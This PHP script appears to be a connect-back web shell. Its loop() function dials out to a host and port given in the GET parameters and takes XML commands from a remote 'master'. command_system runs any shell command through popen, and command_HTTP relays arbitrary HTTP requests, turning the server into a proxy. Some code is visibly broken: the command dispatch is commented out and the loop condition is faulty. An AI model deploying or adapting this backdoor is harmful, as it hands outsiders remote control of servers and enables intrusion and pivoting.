<?php

########
#
#	This section has functions that process the request before running it
#
########

# Calls some parsing functions, and calls runCommand
function processRequest( $requestString )
{
	list($command, $commandParameters, $id) = getCommandParameters( $requestString );
	return runCommand( $command , $commandParameters, $id );
}

# Really does the work specified by the master
function runCommand( $command, $commandParameters, $id )
{
	# This switch() decides what to do based on $command
	switch ($command) {
		case 'system':
			return command_system( $commandParameters, $id );
			break;
		case 'HTTP':
        return command_HTTP( $commandParameters, $id );
        break;
	}
}

########
#
#	This section has XML handling functions
#
########
function resultToXML( $id, $resultString ){

	$result .= "<result>\n<id>" . $id . "</id>\n";
	$result .= "<resultString>" . $resultString . "</resultString>\n<result>\n";
	return $result;
}

# From the requestString, get the command and the parameters
# Also fetch the id of the request
function getCommandParameters( $requestString )
{
	# It's an XML string, no parsing required
	# Returns the command to be runned and the parameters for that command
	# the parameters are stored in an array
	# Example XML:
	# <call>
	# 		<command>system</command>
	#		<id>5812</id>
	#		<parameterList>
	#				<param name="run" >ls</param>
	#		</parameterList>
	# </call>
	#
 	$doc = new DOMDocument();
 	$doc->loadXML( $requestString );
	
	$command = $doc->getElementsByTagName( "command" )->item(0)->nodeValue;	
	$id = $doc->getElementsByTagName( "id" )->item(0)->nodeValue;
	
	$paramArray = array();	
	$parameters = $doc->getElementsByTagName( "param" );
	foreach( $parameters as $parameter )
	{
		$paramArray[ $parameter->getAttribute('name') ] = $parameter->nodeValue;
	}
	
	return array( $command, $paramArray, $id );
}

########
#
#	This section has commands that can be called by the server
#
########

# This function runs the system call and returns the response
function command_system( $commandParameters, $id ){
	$result = '';
		
	# Run the command	
   if ($proc = popen('(' . $commandParameters['run'] . ')2>&1',"r")){
       while (!feof($proc)) $result .= fgets($proc, 1000);
       pclose($proc);
   }	
	
	# Save the response to an xml string
	return resultToXML( $id, $result );	
}

function command_HTTP( $commandParameters, $id ){
	# HTTP parameters	
	# $commandParameters['method']
	# 		The HTTP method used in request
	# $commandParameters['URI']
	# 		The URI to request
	# $commandParameters['headers']
	# 		The headers to send in request
	# $commandParameters['data']
	# 		The postdata
	
	# TCP parameters
	# $commandParameters['host']
	#		The host to connecto to
	# $commandParameters['port']
	#		The port to connect to
	# $commandParameters['secure']
	# 		True if I should use SSL
	
	# Now I create the String to send
	$request .= $commandParameters['method'] . ' ' . $commandParameters['URI'] . ' ' . 'HTTP/1.0\n';
	$request .= $commandParameters['headers'] . '\n\n';
	$request .= $commandParameters['data'];
		
	# Connect to the remote server
	if ($commandParameters['secure'] == 'True'){
		$fp = fsockopen("ssl://" . $commandParameters['host'] , $commandParameters['port'], $errno, $errstr, 30);
	}else{
		$fp = fsockopen("tcp://" . $commandParameters['host'] , $commandParameters['port'], $errno, $errstr, 30);
	}
	
	# Do the request to the remote server
	fwrite($fp, $request);
   
   # Receive the response
   while (!feof($fp)) {
        $result .= fgets($fp, 128);
   }
   fclose($fp);	
	
	# Parse the response and send it as XML	
	return resultToXML( $id, $result );
}

########
#
#	This is the "main" section
#
########

# connect to remote server, and parse the commands as they arrive
function loop( $host, $port ) {

	$fp = fsockopen("tcp://" . $host , $port, $errno, $errstr, 30);

	if (!$fp) {
    	echo "$errstr ($errno)<br />\n";
	} else {
	
		# loop until the server says "stop"
		# or until the apache hits the "max execution time"
		$go = true;
		$buf = '';
		while ( go ) {    
   		fwrite($fp, '<ready/>');
   		
   		$requestToProcess = "";
   		while ( !strstr( $requestToProcess, '</call>' ) ) {
        		$requestToProcess .= fgets($fp, 128);
   		}
   		
  			#$responseXML = processRequest( $requestToProcess );
   		fwrite($fp, $requestToProcess );
					
		}    
   	fclose($fp);
	}
}

#loop( $_POST['h'], $_POST['p'] );
loop( $_GET['h'], $_GET['p'] );

?>
